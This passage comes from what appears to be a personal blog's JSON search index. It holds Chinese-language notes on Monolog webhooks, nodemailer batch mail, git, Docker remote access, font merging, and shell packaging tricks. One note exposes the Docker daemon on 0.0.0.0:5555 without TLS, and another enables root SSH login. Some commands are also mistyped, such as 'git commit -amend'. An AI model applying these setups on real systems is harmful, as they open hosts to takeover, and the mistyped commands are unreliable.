class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Monolog</span>\\<span class=\"title\">Logger</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Monolog</span>\\<span class=\"title\">Handler</span>\\<span class=\"title\">StreamHandler</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Monolog</span>\\<span class=\"title\">Handler</span>\\<span class=\"title\">SlackWebhookHandler</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// create a log channel</span></span><br><span class=\"line\">$log = <span class=\"keyword\">new</span> Logger(<span class=\"string\">'name'</span>);</span><br><span class=\"line\">$log-&gt;pushHandler(<span class=\"keyword\">new</span> StreamHandler(<span class=\"string\">'path/to/your.log'</span>, Logger::WARNING));</span><br><span class=\"line\">$log-&gt;pushHandler(<span class=\"keyword\">new</span> SlackWebhookHandler(<span class=\"string\">'https://hooks.slack.com/services/xxxxx'</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// add records to the log</span></span><br><span class=\"line\">$log-&gt;warning(<span class=\"string\">'Foo'</span>);</span><br><span class=\"line\">$log-&gt;crit(<span class=\"string\">'中文測試'</span>);</span><br></pre></td></tr></table></figure>\n<img src=\"/blog/2019/03/19/使用monolog和slack-做webhook小記/3.png\" title=\"成果圖\">\n<p>這邊還需要注意一件事情<br><code>$log-&gt;pushHandler(new SlackWebhookHandler(&#39;https://hooks.slack.com/services/xxxxx&#39;));</code><br>這邊沒有指定 level 等級<br>我發現 monolog 原生物件 hanlder 每一個預設 level 都不太一樣<br>以這邊 slack 為例，他預設是<code>$level = Logger::CRITICAL</code><br>PS 所以上方的 warning 程式不會在 slack 出現<br>不知道的話可以直接看原始碼比較快</p>\n<p><a href=\"https://juejin.im/entry/574f072d49830c00584680de\" target=\"_blank\" rel=\"noopener\">The PHP Package 之 monolog 不完全但够用指南 - 后端 - 掘金</a><br><a href=\"https://learnku.com/docs/laravel/5.4/errors/1249\" target=\"_blank\" rel=\"noopener\">错误与日志 | 《Laravel 5.4 中文文档》 | Laravel China 社区 - 高品质的 Laravel 开发者社区</a></p>\n<blockquote>\n<p>一旦配置了此选项，Laravel 将记录大于或等于指定日志等级的所有级别。例如，默认将 log_level 设置为 error 那么将会记录 error , critical , alert 和 emergency 日志信息。<br>Monolog 识别以下日志等级 - 从低到高为: debug , info , notice , warning , error , critical , alert , emergency。</p>\n</blockquote>\n<p>這邊先小記，哈哈，不知道之後有沒有有空再寫一篇</p>\n<p>話說 flexget 好像也能做 slack,discord<br>剛好最近有用 discord<br>有空研究看看</p>\n<p>2019-03-20</p>\n<p>今天剛好看到 github 有 discord 的 webhook 現成工具<br><a href=\"https://github.com/lefuturiste/monolog-discord-handler\" target=\"_blank\" rel=\"noopener\">lefuturiste/monolog-discord-handler: A simple discord handler for support Discord webhooks</a><br>原本要找 webhook<br>進去 discord 開發者頁面找不到 webhook<br>後來 google 一下<br>原來可以到<code>頻道設定</code>裡面有 webhook<br>輕鬆就能新增 webhook</p>\n<img src=\"/blog/2019/03/19/使用monolog和slack-做webhook小記/4.png\" title=\"頻道設定1\">\n<img src=\"/blog/2019/03/19/使用monolog和slack-做webhook小記/5.png\" title=\"頻道設定2\">\n<p>程式碼</p>\n<figure class=\"highlight php\"><figcaption><span>discord.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">'./vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Monolog</span>\\<span class=\"title\">Logger</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$log = <span class=\"keyword\">new</span> Monolog\\Logger(<span class=\"string\">'your name'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$log-&gt;pushHandler(<span class=\"keyword\">new</span> DiscordHandler\\DiscordHandler([</span><br><span class=\"line\"><span class=\"string\">'https://discordapp.com/api/webhooks/xxxxxxxxx/ooooooooooooooooooooooooooooooooooooooooo'</span></span><br><span class=\"line\">], <span class=\"string\">'name'</span>, <span class=\"string\">'subname'</span>, <span class=\"string\">'DEBUG'</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// add records to the log</span></span><br><span class=\"line\">$log-&gt;warning(<span class=\"string\">'Foo'</span>);</span><br><span class=\"line\">$log-&gt;crit(<span class=\"string\">'中文測試'</span>);</span><br></pre></td></tr></table></figure>\n<img src=\"/blog/2019/03/19/使用monolog和slack-做webhook小記/6.png\" title=\"成果\">\n","categories":["PHP"],"tags":["php","monolog","slack"]},{"title":"使用nodemailer做批次寄信","url":"/blog/2018/10/30/%E4%BD%BF%E7%94%A8nodemailer%E5%81%9A%E6%89%B9%E6%AC%A1%E5%AF%84%E4%BF%A1/","content":"<p>由於之前工單信件寫錯…<br>需要補寄信件給使用者<br>今天研究nodejs使用nodemailer發信<br>發現真的還滿簡單好用<br>說不定下次就有機會可以用到</p>\n<a id=\"more\"></a>\n<h2 id=\"nodemailer\"><a href=\"#nodemailer\" class=\"headerlink\" title=\"nodemailer\"></a>nodemailer</h2><p><a href=\"https://github.com/malagege/sample-code-node-mail-batch\" target=\"_blank\" rel=\"noopener\">malagege/sample-code-node-mail-batch: 批次發信範例</a></p>\n<p><code>可注意(1)(2)(3)要改的地方</code><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/////////(1)</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> csvFilePath=<span class=\"string\">'data.csv'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mail_from = <span class=\"string\">'from@xxxx.com.tw'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> subject = <span class=\"string\">'標題'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> nodemailer = <span class=\"built_in\">require</span>(<span class=\"string\">'nodemailer'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> csv=<span class=\"built_in\">require</span>(<span class=\"string\">'csvtojson'</span>)</span><br><span class=\"line\"><span class=\"comment\">/////////(2)</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> transporter = nodemailer.createTransport(&#123;</span><br><span class=\"line\">    host: <span class=\"string\">'mail_server_url'</span>,</span><br><span class=\"line\">    port: <span class=\"number\">25</span> ,</span><br><span class=\"line\">    secure: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    auth: &#123;</span><br><span class=\"line\">        user: <span class=\"string\">'from@xxxx.com.tw'</span>,</span><br><span class=\"line\">        pass: <span class=\"string\">'password'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">csv()</span><br><span class=\"line\">.fromFile(csvFilePath)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">jsonObj</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// console.log(jsonObj);</span></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [</span></span><br><span class=\"line\"><span class=\"comment\">     * \t&#123;a:\"1\", b:\"2\", c:\"3\"&#125;,</span></span><br><span class=\"line\"><span class=\"comment\">     * \t&#123;a:\"4\", b:\"5\". c:\"6\"&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * ]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span> </span><br><span class=\"line\"></span><br><span class=\"line\">    jsonObj.forEach(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">/////////(3)</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> mail_to = data.usermail</span><br><span class=\"line\">        <span class=\"keyword\">let</span> email_template = <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">        Hello World!!!!</span></span><br><span class=\"line\"><span class=\"string\">        &lt;img src=\"<span class=\"subst\">$&#123;data.pic_url&#125;</span>\"&gt;&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        姓名：<span class=\"subst\">$&#123;data.username&#125;</span>&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        訂單編號：<span class=\"subst\">$&#123;data.no&#125;</span>&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        `</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">var</span> mailOptions = &#123;</span><br><span class=\"line\">          <span class=\"keyword\">from</span>: mail_from,</span><br><span class=\"line\">          to: mail_to,     <span class=\"comment\">//寄送人</span></span><br><span class=\"line\">          subject: subject,</span><br><span class=\"line\">          html: email_template,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        </span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"comment\">// verify connection configuration</span></span><br><span class=\"line\">      <span class=\"comment\">// transporter.verify(function(error, success) &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//   if (error) &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//        console.log(error);</span></span><br><span class=\"line\">      <span class=\"comment\">//   &#125; else &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//        console.log('Server is ready to take our messages');</span></span><br><span class=\"line\">      <span class=\"comment\">//   &#125;</span></span><br><span class=\"line\">      <span class=\"comment\">// &#125;);</span></span><br><span class=\"line\">      </span><br><span class=\"line\">      transporter.sendMail(mailOptions, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">error, info</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (error) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">console</span>.log(<span class=\"string\">'mail_to:'</span> + mail_to)</span><br><span class=\"line\">          <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"built_in\">console</span>.log(mail_to + <span class=\"string\">' , Email sent: '</span> + info.response);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      </span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>另外，附加檔案可以參考<a href=\"https://github.com/malagege/sample-code-node-mail-batch/blob/master/test_add_file.js\" target=\"_blank\" rel=\"noopener\">sample-code-node-mail-batch/test_add_file.js at master · malagege/sample-code-node-mail-batch</a></p>\n<p>程式參考來源:<br><a href=\"http://blog.fens.me/nodejs-email-nodemailer/\" target=\"_blank\" rel=\"noopener\">Nodejs发邮件组件Nodemailer | 粉丝日志</a>  <a href=\"/blog/2018/10/30/使用nodemailer做批次寄信/web_bk.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"preview-email\"><a href=\"#preview-email\" class=\"headerlink\" title=\"preview-email\"></a>preview-email</h2><p><a href=\"https://www.npmjs.com/package/preview-email\" target=\"_blank\" rel=\"noopener\">https://www.npmjs.com/package/preview-email</a></p>\n<p>可以簡單看預覽信件內容<br>雖然我覺得可以用寫死一個信箱看…<br>缺點好像附加檔案cid會抓不到</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> previewEmail = <span class=\"built_in\">require</span>(<span class=\"string\">'preview-email'</span>);</span><br><span class=\"line\">...</span><br><span class=\"line\">previewEmail(message).then(<span class=\"built_in\">console</span>.log).catch(<span class=\"built_in\">console</span>.error);</span><br><span class=\"line\"><span class=\"comment\">//transport.sendMail(message).then(console.log).catch(console.error);</span></span><br></pre></td></tr></table></figure>\n<p>message跟nodemailer搭配</p>\n<p>最後，email-templates我就沒研究了<br>看了文件感覺很複雜<br>我就先用程式邏輯就可以跑出我想要的</p>\n","categories":["JavaScript"],"tags":["nodejs","mail","nodemailer"]},{"title":"git修改最後一個commit(修改檔案)","url":"/blog/2018/07/19/%E4%BF%AE%E6%94%B9%E6%9C%80%E5%BE%8C%E4%B8%80%E5%80%8Bcommit-%E4%BF%AE%E6%94%B9%E6%AA%94%E6%A1%88/","content":"<p><code>git commit -amend</code>可修改對上一個commit檔案<br>git add <code>file</code><br><code>git commit -amend</code><br>假如說明要變動可下<br><code>git commit -amend &#39;Hello World&#39;</code></p>\n<p>之前沒注意到git commit -amend可以對最後一個commit做修正<br>以為只能對commit 說明做修改<br>筆記筆記</p>\n<p>不知道會不會對已經push repo有沒有影響<br>改天再實驗一下</p>\n<p><a href=\"https://backlog.com/git-tutorial/tw/stepup/stepup7_1.html\" target=\"_blank\" rel=\"noopener\">1. Commit –amend【教學3 改寫提交】 | 連猴子都能懂的Git入門指南 | 貝格樂（Backlog）</a></p>\n","categories":["Git"],"tags":["git","amend"]},{"title":"兩個git repo合併在一起","url":"/blog/2018/08/16/%E5%85%A9%E5%80%8Bgit-repo%E5%90%88%E4%BD%B5%E5%9C%A8%E4%B8%80%E8%B5%B7/","content":"<p>最近接到一個程式修改，原本我以為沒有git<br>但是作完的時候，副理跟我說需要盒併他的git<br>網路找到相關資料，就結論而且不時適合做merge</p>\n<a id=\"more\"></a>\n<p>兩個git該如何合併呢?<br><a href=\"https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/merge-conflicts\" target=\"_blank\" rel=\"noopener\">处理合并冲突</a><br><a href=\"https://segmentfault.com/q/1010000009549291\" target=\"_blank\" rel=\"noopener\">git - 为什么要先commit，然后pull，最后再push？而不是commit然后直接push？ - SegmentFault 思否</a></p>\n<p><a href=\"https://stackoverflow.com/questions/5120038/is-it-possible-to-cherry-pick-a-commit-from-another-git-repository\" target=\"_blank\" rel=\"noopener\">Is it possible to cherry-pick a commit from another git repository? - Stack Overflow</a></p>\n<ol>\n<li>add remote xxx url</li>\n<li>git fetch xxx</li>\n<li>git checkout -b ooo xxx/master</li>\n<li>可以做merge動作(但是可能會有很多衝突)</li>\n</ol>\n<p>事後想想，應該我直接<code>git clone 對方git</code><br>做合併應該比較快<br>就依對方做commit就好</p>\n","categories":["Git"],"tags":["git","merge"]},{"title":"使用phpstorm用docker remote遠端操作","url":"/blog/2018/05/26/%E4%BD%BF%E7%94%A8phpstorm%E7%94%A8docker-remote%E9%81%A0%E7%AB%AF%E6%93%8D%E4%BD%9C/","content":"<p>最近在測試phpstorm<br>因為不想在window 10上灌docker<br>想遠端連docker<br>發現phpstorm好像有遠端控制選項</p>\n<img src=\"/blog/2018/05/26/使用phpstorm用docker-remote遠端操作/phpstorm_docker.png\" title=\"phpstorm設定docker選項\">\n<a id=\"more\"></a>\n<p>在使用內建遠端時候<br>起注意這個會有安全性的問題<br>至於我在家裡使用<br>不需要考慮到這一塊<br>暫時不考慮TSL那一塊</p>\n<p>之前有買「Docker入門與實戰」<br>但是書上docker daemon用不出來</p>\n<p>後來看了網路用法不太一樣<br><a href=\"https://deepzz.com/post/dockerd-and-docker-remote-api.html\" target=\"_blank\" rel=\"noopener\">远程连接docker daemon，Docker Remote API | Deepzz’s Blog</a></p>\n<p><a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#description\" target=\"_blank\" rel=\"noopener\">https://docs.docker.com/engine/reference/commandline/dockerd/#description</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo &lt;path to&gt;/dockerd -H 0.0.0.0:5555 &amp;</span><br></pre></td></tr></table></figure></p>\n<p>打上這樣久能開啟5555 port給phpstorm操作使用<br>不過在第一次開啟感覺還是打指令比較方便耶…</p>\n<p>當然也可以照<a href=\"https://deepzz.com/post/dockerd-and-docker-remote-api.html\" target=\"_blank\" rel=\"noopener\">远程连接docker daemon，Docker Remote API | Deepzz’s Blog</a><br>設定/etc/docker/daemon.json在執行<code>dockerd</code></p>\n<p>這樣就能愉悅在phpstorm玩docker</p>\n","categories":["docker"],"tags":["docker","phpstorm"]},{"title":"兩個字型合併方法","url":"/blog/2021/02/02/%E5%85%A9%E5%80%8B%E5%AD%97%E5%9E%8B%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/","content":"<p>最近維運很常做造難字部份<br>我使用font forge 去新增字體<br>最近在想有沒有比較快速方法</p>\n<h2 id=\"平常手動維運處理\"><a href=\"#平常手動維運處理\" class=\"headerlink\" title=\"平常手動維運處理\"></a>平常手動維運處理</h2><p>TW-Kai-Ext-B-98_1.ttf 通常會在這邊找難字</p>\n<h2 id=\"找的相關工具\"><a href=\"#找的相關工具\" class=\"headerlink\" title=\"找的相關工具\"></a>找的相關工具</h2><p>有去 Github 找相關 Project … 但幾乎都失敗<br>所以我就不特別紀錄了</p>\n<h3 id=\"script\"><a href=\"#script\" class=\"headerlink\" title=\"script\"></a>script</h3><p>TODO: 測試<br><a href=\"https://linuxhint.com/merge_two_fonts_linux/\" target=\"_blank\" rel=\"noopener\">How to Merge Two Fonts in Linux – Linux Hint</a></p>\n<h2 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h2><ul>\n<li><a href=\"http://ajax-chen.blogspot.com/2016/05/abc-pdf.html\" target=\"_blank\" rel=\"noopener\">阿吉的部落格: 在 ABC pdf 中嵌入造字</a></li>\n<li><a href=\"https://dotblogs.com.tw/rainmaker/2016/03/11/140808\" target=\"_blank\" rel=\"noopener\">[Font]使用者自造字(EUDC)成功轉到 PDF 的方式 | 亂馬客 - 點部落</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/questions/10201369\" target=\"_blank\" rel=\"noopener\">Crystal Report轉PDF使用全字庫的難字問題~ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://github.com/foliojs/fontkit\" target=\"_blank\" rel=\"noopener\">foliojs/fontkit: An advanced font engine for Node and the browser</a></li>\n<li><a href=\"https://www.google.com/search?q=fontkit+merge+font&amp;client=firefox-b-d&amp;sxsrf=ALeKk01qWVlRrnZPwM320bJyxNP5raWybg:1612273559183&amp;ei=l1cZYJHgCrPUmAWfwZq4Dg&amp;start=10&amp;sa=N&amp;ved=2ahUKEwjRh5qGq8vuAhUzKqYKHZ-gBucQ8NMDegQICBBO&amp;biw=1408&amp;bih=708&amp;dpr=2.73\" target=\"_blank\" rel=\"noopener\">fontkit merge font - Google 搜尋</a></li>\n<li><a href=\"https://linuxhint.com/merge_two_fonts_linux/\" target=\"_blank\" rel=\"noopener\">How to Merge Two Fonts in Linux – Linux Hint</a></li>\n<li><a href=\"https://superuser.com/questions/490922/merging-two-fonts\" target=\"_blank\" rel=\"noopener\">Merging two fonts - Super User</a></li>\n</ul>\n","categories":["Linux"],"tags":["font"]},{"title":"兩個資料比對方法","url":"/blog/2019/09/02/%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95/","content":"<p>最近做兩個資料比較<br>一直常常做這件事情<br>不知道有沒有比較發便的做法</p>\n<a id=\"more\"></a>\n<p>先說說我常用的方法</p>\n<h2 id=\"Visual-Studio-Code-比較方法\"><a href=\"#Visual-Studio-Code-比較方法\" class=\"headerlink\" title=\"Visual Studio Code 比較方法\"></a>Visual Studio Code 比較方法</h2><p>首先把一列資料貼在 Sublime F9 做排序(Excel也可以XD)<br>在貼到 Visual Studio Code 做 diff 動作<br>這方法快速簡單，但只能比對一行資料</p>\n<h2 id=\"Excel-大法\"><a href=\"#Excel-大法\" class=\"headerlink\" title=\"Excel 大法\"></a>Excel 大法</h2><p>Excel 我不熟，有爬到一些方法</p>\n<p><a href=\"http://lyc017.pixnet.net/blog/post/184627407-%E3%80%90excel%E3%80%91%E6%AF%94%E5%B0%8D%E9%9B%99%E6%96%B9%E8%B3%87%E6%96%99%E7%9A%84%E5%90%8C%E7%95%B0%E8%99%95%EF%BC%88iferror%E3%80%81vlooku\" target=\"_blank\" rel=\"noopener\">【Excel】比對雙方資料的同異處（IFERROR、VLOOKUP、IF） @ ＊YC的筆記鋪 :: 痞客邦 ::</a><br><a href=\"https://kknews.cc/zh-tw/education/xve4k38.html\" target=\"_blank\" rel=\"noopener\">Excel應用 如何快速比對兩列數據相同點和不同點 每個人都會用到 - 每日頭條</a><br><a href=\"https://www.mobile01.com/topicdetail.php?f=511&amp;t=2956123&amp;p=1\" target=\"_blank\" rel=\"noopener\">兩份 excel 文件比對 - 文書處理 - 電腦討論區 - Mobile01</a><br><a href=\"https://ithelp.ithome.com.tw/questions/10186750\" target=\"_blank\" rel=\"noopener\">Excel內兩個sheet資料內容差異比對.. - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<h2 id=\"pandas\"><a href=\"#pandas\" class=\"headerlink\" title=\"pandas\"></a>pandas</h2><p>一樣不熟，有空來用用</p>\n<p><a href=\"https://stackoverflow.com/questions/20225110/comparing-two-dataframes-and-getting-the-differences\" target=\"_blank\" rel=\"noopener\">python - Comparing two dataframes and getting the differences - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/48647534/python-pandas-find-difference-between-two-data-frames\" target=\"_blank\" rel=\"noopener\">Python Pandas - Find difference between two data frames - Stack Overflow</a><br><a href=\"https://ask.wellsr.com/\" target=\"_blank\" rel=\"noopener\">grades1 </a></p>\n<h3 id=\"excel-diff\"><a href=\"#excel-diff\" class=\"headerlink\" title=\"excel-diff\"></a>excel-diff</h3><p><a href=\"https://matthewkudija.com/blog/2018/07/21/excel-diff/\" target=\"_blank\" rel=\"noopener\">Diff Two Excel Files with Python | Matthew Kudija</a><br><a href=\"https://github.com/mkudija/blog/tree/master/content/downloads/code/excel-diff\" target=\"_blank\" rel=\"noopener\">blog/content/downloads/code/excel-diff at master · mkudija/blog</a></p>\n<p>爬到這篇，有現成範例程式<br>剛好前幾天有安裝 Jupyter Notebook (Anaconda3)<br>打開Notebook 裡面的 Terminal<br>直接執行就可以用，相對 excel-diff-3 跟 excel-diff-2 結果是相同<br><strong>這個唯一需要注意 UID 需要一致 也必須是數字</strong><br>excel-diff-1 新增/移除資料不會抓到，但是不需要指定 UID 樣子<br>這個好用工具還是有限制的</p>\n<p>有發現好的方法持續補充</p>\n","categories":["實用工具"],"tags":["csv","xlsx"]},{"title":"另類快速打包commmit程式方法","url":"/blog/2019/05/20/%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/","content":"<p><a href=\"https://malagege.github.io/blog/2019/01/05/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/\">快速打包程式的腳本(shell) | 程式狂想筆記</a><br>之前有寫過這篇，再包程式都是固定的程式<br>有時候公司需要打包只有異動到的檔案<br>這時候之前寫的程式內容可以修正<br>但我在想有什麼快速整理</p>\n<a id=\"more\"></a>\n<h2 id=\"使用-GIT-抓取異動檔案\"><a href=\"#使用-GIT-抓取異動檔案\" class=\"headerlink\" title=\"使用 GIT 抓取異動檔案\"></a>使用 GIT 抓取異動檔案</h2><p><code>git diff --stat</code><br>會顯示異動檔案，當然也會有後面的異動行數</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git diff head^ --name-only</span><br></pre></td></tr></table></figure>\n<p>可抓上次異動的檔案</p>\n<p>這時候可以貼到<a href=\"https://malagege.github.io/blog/2019/01/05/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/\">快速打包程式的腳本(shell) | 程式狂想筆記</a>之前的 code</p>\n<h2 id=\"cp-複製檔案\"><a href=\"#cp-複製檔案\" class=\"headerlink\" title=\"cp 複製檔案\"></a>cp 複製檔案</h2><p>假如複製少許檔案<br>使用 git diff 抓取少許檔案<br>為了貼一個檔案，就用腳本工具也挺麻煩<br>可以直接使用<code>cp</code>指令</p>\n<p>在<a href=\"https://stackoverflow.com/a/8722721\" target=\"_blank\" rel=\"noopener\">bash - Linux: copy and create destination dir if it does not exist - Stack Overflow</a>有提到用<code>--parents</code>可以解決問題</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmp $ mkdir foo</span><br><span class=\"line\">/tmp $ mkdir foo/foo</span><br><span class=\"line\">/tmp $ touch foo/foo/foo.txt</span><br><span class=\"line\">/tmp $ mkdir bar</span><br><span class=\"line\">/tmp $ cp --parents foo/foo/foo.txt bar</span><br><span class=\"line\">/tmp $ ls bar/foo/foo</span><br><span class=\"line\">foo.txt</span><br></pre></td></tr></table></figure>\n<p>複製檔案範例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp --parents foo/foo/foo.txt(打包檔案) ~/(打包路徑)</span><br><span class=\"line\">#ex</span><br><span class=\"line\">cp --parent ooo/xxx.php ~/Desktop</span><br></pre></td></tr></table></figure>\n<p>用 Sublime Text 快速貼上也很快 XD</p>\n<h3 id=\"cp-另類複製方法\"><a href=\"#cp-另類複製方法\" class=\"headerlink\" title=\"cp 另類複製方法\"></a>cp 另類複製方法</h3><p>但有看到 Mac 不能用<code>--parents</code><br>有看到一種方法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p /foo/bar &amp;&amp; cp myfile.txt <span class=\"variable\">$_</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://stackoverflow.com/a/32596855\" alt=\"參考網址\"></p>\n<p>查了一下，<code>$_</code>這個參數很特別<br>是抓取前一個指令最後面一個參數</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$_</span></span><br><span class=\"line\"><span class=\"comment\"># git</span></span><br><span class=\"line\">ll</span><br><span class=\"line\"><span class=\"built_in\">echo</span> $)</span><br><span class=\"line\"><span class=\"comment\">#-l  (抓取上一個指令最後一個參數，若沒參數就是指令)</span></span><br></pre></td></tr></table></figure>\n<p>所以\\$_可以做這樣運用</p>\n<p><a href=\"https://www.slideshare.net/misscoming/bash-shell-script\" target=\"_blank\" rel=\"noopener\">Bash shell script 教學</a><br><a href=\"https://image.slidesharecdn.com/bashshellscript-150218092059-conversion-gate01/95/bash-shell-script-10-638.jpg?cb=1424287937\" target=\"_blank\" rel=\"noopener\">bash-shell-script-10-638.jpg（JPEG 圖片，638x479 像素）</a></p>\n<h2 id=\"7z-快速壓縮打包\"><a href=\"#7z-快速壓縮打包\" class=\"headerlink\" title=\"7z 快速壓縮打包\"></a>7z 快速壓縮打包</h2><p>2019-05-22<br>用 CP 指令打包，還需要手動作壓縮<br>今天有找到一個方法<br>設定 <code>file.txt</code> 可完成快入打包<br>file.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xxx/ooo.jpg</span><br><span class=\"line\">xxx/ooo.jpg</span><br><span class=\"line\">xxx/ooo.jpg</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">now=`date +<span class=\"string\">\"%Y%m%d_%H%M\"</span>`</span><br><span class=\"line\">7z a  DestinyTest_<span class=\"variable\">$now</span>.7z @file.txt</span><br></pre></td></tr></table></figure>\n<p>真的非常方便</p>\n<p>相關連結</p>\n<ul>\n<li><a href=\"https://askubuntu.com/questions/777049/how-do-i-zip-up-multiple-files-on-command-line\" target=\"_blank\" rel=\"noopener\">bash - How do I zip up multiple files on command line? - Ask Ubuntu</a></li>\n<li><a href=\"https://superuser.com/questions/940878/how-to-pass-multiple-files-to-zip-in-a-single-command-using-7-zip\" target=\"_blank\" rel=\"noopener\">7 zip - How to pass multiple files to zip in a single command using 7 zip? - Super User</a></li>\n<li><a href=\"https://www.opencli.com/linux/linux-date-format-shell-script\" target=\"_blank\" rel=\"noopener\">Linux 日期格式 - Shell Script 自訂格式</a></li>\n<li><a href=\"https://serverfault.com/questions/652892/create-zip-based-on-contents-of-a-file-list\" target=\"_blank\" rel=\"noopener\">terminal - create zip based on contents of a file list - Server Fault</a></li>\n<li><a href=\"https://github.com/portainer/portainer/issues/322\" target=\"_blank\" rel=\"noopener\">Can’t using vim editor on console connection with container. · Issue #322 · portainer/portainer</a></li>\n</ul>\n","categories":["shell"],"tags":["shell"]},{"title":"啟用樹梅派 root 帳號","url":"/blog/2019/10/20/%E5%95%9F%E7%94%A8%E6%A8%B9%E6%A2%85%E6%B4%BE-root-%E5%B8%B3%E8%99%9F/","content":"<p>最近要測試環境<br>拿我手上沒在跑的樹梅派開 root<br>沒想到有幾個流程<br>因為不常做，所以小記一下</p>\n<a id=\"more\"></a>\n<ol>\n<li><p>sudo passwd root<br>打密碼</p>\n</li>\n<li><p>sudo passwd –unlock root</p>\n</li>\n<li><p>sudo nano /etc/ssh/sshd_config<br>我沒看到 PermitRootLogin without-password<br>新增 PermitRootLogin yes</p>\n</li>\n<li><p>reboot<br>重開機</p>\n</li>\n</ol>\n<p>這樣就能用 root 燈入了</p>\n","categories":["Linux"],"tags":["linux"]},{"title":"在 Linux 設定排程超過執行時間 kill 掉方法","url":"/blog/2019/10/05/%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95/","content":"<p>最近有一隻排程有時候會卡死<br>但在想有沒有 crontab 設定方法<br>網路上爬有爬到解決方法<br>使用 timeout 指令</p>\n<a 